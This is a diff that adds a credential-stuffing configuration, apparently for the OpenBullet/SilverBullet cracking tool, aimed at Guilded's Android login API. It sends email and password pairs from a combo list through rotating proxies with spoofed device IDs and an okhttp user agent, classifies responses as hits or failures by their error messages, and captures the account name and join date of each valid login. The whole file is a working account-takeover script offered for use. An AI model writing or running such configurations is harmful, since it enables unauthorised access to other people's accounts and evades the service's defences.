@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "Guilded Android API Config",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-09T17:04:30.4344824+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "simple",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "GUID" 
+
+FUNCTION RandomString "c?d?d?d?d?d?d?dc?d?d?df?dc?d" -> VAR "DEVICEID" 
+
+REQUEST POST "https://www.guilded.gg/api/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json" 
+  HEADER "guilded-client-id: <GUID>" 
+  HEADER "guilded-device-id: <DEVICEID>" 
+  HEADER "guilded-nonprod-waf-pw: null" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: www.guilded.gg" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.12.12" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 55" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email or password is incorrect." 
+    KEY "Email not found." 
+  KEYCHAIN Success OR 
+    KEY "id" 
+
+PARSE "<SOURCE>" LR "\"name\":\"" "\"," CreateEmpty=FALSE -> CAP "NAME" 
+
+PARSE "<SOURCE>" LR ",\"joinDate\":\"" "\",\"" CreateEmpty=FALSE -> CAP "JOIN DATE" 
+
